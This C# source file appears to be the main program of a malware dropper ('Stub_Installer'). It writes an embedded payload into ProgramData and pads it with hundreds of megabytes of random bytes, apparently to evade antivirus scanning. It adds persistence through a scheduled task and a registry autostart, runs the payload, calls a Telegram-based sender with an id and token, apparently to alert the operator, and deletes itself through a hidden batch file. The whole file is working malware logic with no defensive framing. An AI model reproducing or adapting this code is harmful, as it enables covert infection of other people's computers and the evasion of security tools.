using Stub_Installer.Telegram;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub_Installer
{
    internal class Program
    {
        public static DirectoryInfo workPatch = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), Static.dir));
        public static FileInfo workFile = new FileInfo(Path.Combine(workPatch.FullName, Static.bin + ".exe"));
        static void Main(string[] args)
        {
            try
            {
                if (!File.Exists(workFile.FullName))
                {
                    List<Thread> AutoStart = new List<Thread>();
                    AutoStart.Add(new Thread(() => Install()));
                    AutoStart.Add(new Thread(() => Sturtup.Task()));
                    AutoStart.Add(new Thread(() => Sturtup.Reg(true, Static.taskName, workFile.FullName)));
                    foreach (Thread t in AutoStart)
                        t.Start();
                    foreach (Thread t in AutoStart)
                        t.Join();
                }
                else
                {
                    Del();
                }
            }
            catch { Del(); }
        }

        public static void Install()
        {
            try
            {
                workPatch = Directory.CreateDirectory(workPatch.FullName);
                Directory.CreateDirectory(workPatch.FullName);
                workPatch.Refresh();

                FileStream fs = new FileStream(workFile.FullName, FileMode.OpenOrCreate);
                fs.Write(Byte_C.rawData, 0, Byte_C.rawData.Length);
                byte[] addB = new byte[new Random().Next(650000 * 1024, 800000 * 1024)];
                new Random().NextBytes(addB);
                fs.Write(addB, 0, addB.Length);
                fs.Dispose();

                if (File.Exists(workFile.FullName))
                {
                    Process.Start(workFile.FullName);
                    Sender.Get(Static.id, Static.token);
                }
                Del();

            }
            catch { Del(); }

        }

        public static void Del()
        {
            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 10 > NUL");
                sw.WriteLine("CD " + Application.StartupPath);
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);
        }
    }
}
